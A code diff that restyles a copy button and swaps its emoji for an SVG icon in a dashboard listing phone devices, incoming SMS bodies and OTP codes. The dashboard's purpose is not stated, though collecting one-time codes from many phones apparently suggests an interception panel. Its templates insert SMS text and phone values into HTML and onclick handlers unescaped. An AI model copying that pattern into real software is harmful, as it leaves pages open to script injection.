@@ -486,14 +486,19 @@ button { -webkit-tap-highlight-color: transparent; }
   .tab { font-size: 9px; }
 }
 
-.copy-btn{
- display:inline-flex;align-items:center;justify-content:center;
- width:28px;height:28px;margin-left:8px;
- border:1px solid rgba(255,255,255,.15);
- border-radius:8px;background:rgba(255,255,255,.08);
- cursor:pointer;color:#fff;font-size:14px;
+.copy-btn {
+  display: inline-flex; align-items: center; justify-content: center;
+  width: 30px; height: 30px; margin-left: 8px;
+  border: 1px solid rgba(255,255,255, 0.12); border-radius: 9px;
+  background: rgba(255,255,255, 0.05); color: var(--muted);
+  cursor: pointer; transition: all 0.15s ease; outline: none;
 }
-.copy-btn:hover{background:rgba(255,255,255,.12);}
+.copy-btn:hover {
+  color: var(--text); border-color: rgba(56, 189, 248, 0.4);
+  background: rgba(56, 189, 248, 0.12); box-shadow: 0 0 12px rgba(56, 189, 248, 0.2);
+}
+.copy-btn:active { transform: scale(0.96); }
+.copy-btn svg { width: 14px; height: 14px; fill: none; stroke: currentColor; stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; }
 
 
 .fav-btn{
@@ -755,7 +760,7 @@ function renderDeviceSummary(device, messages) {
   return `<div class="device-summary">
     <div class="device-summary-top">
       <div>
-        <div class="device-summary-title">${getDeviceTitle(d)} <button class="copy-btn" onclick="copyText(\`${getDeviceTitle(d)}\`,event)">📋</button><button class="fav-btn" onclick="event.stopPropagation();toggleFav('${d.id||phone}')">⭐</button></div>
+        <div class="device-summary-title">${getDeviceTitle(d)} <button class="copy-btn" onclick="copyText(\`${getDeviceTitle(d)}\`,event)"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg></button><button class="fav-btn" onclick="event.stopPropagation();toggleFav('${d.id||phone}')">⭐</button></div>
         <div class="device-summary-id">${d.id || 'Unknown device id'}</div>
       </div>
       <span class="badge ${badgeClass(norm)}">${badgeLabel(norm, d.status || 'Unknown')}</span>
@@ -971,7 +976,7 @@ function renderList() {
     const ago = latestSmsTime ? 'SMS ' + timeAgo(latestSmsTimeMap[d.id] || d.last_active) : timeAgo(d.last_active);
     return `<div class="device-row" onclick="openSms(\'${d.id}\')" style="cursor:pointer">
       <div class="dev-left">
-        <div class="dev-phone">${phone} <button class="copy-btn" onclick="copyText(\`${phone}\`,event)">📋</button></div>
+        <div class="dev-phone">${phone} <button class="copy-btn" onclick="copyText(\`${phone}\`,event)"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg></button></div>
         <div class="dev-id" onclick="openSms(\'${d.id}\')" style="cursor:pointer;color:#2AABEE">${d.id}</div>
         ${recentHtml}
         ${net ? `<div class="dev-net">${net}</div>` : ''}
@@ -1211,7 +1216,7 @@ function renderLiveCard(s){
         <span class="status-pill ${statusClass}">${statusLabel}</span>
       </div>
     </div>
-    <div class="sms-card-device">${phone} <button class="copy-btn" onclick="event.stopPropagation();copyText('${phone}',event)">📋</button></div>
+    <div class="sms-card-device">${phone} <button class="copy-btn" onclick="event.stopPropagation();copyText('${phone}',event)"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg></button></div>
     <div style="font-size:11px;color:var(--muted)">${s.device_id||''}</div>
     <div class="sms-card-body">${s.body||''}</div>
     ${s.otp_code ? `<div class="otp-chip">OTP: ${s.otp_code}</div>` : ''}
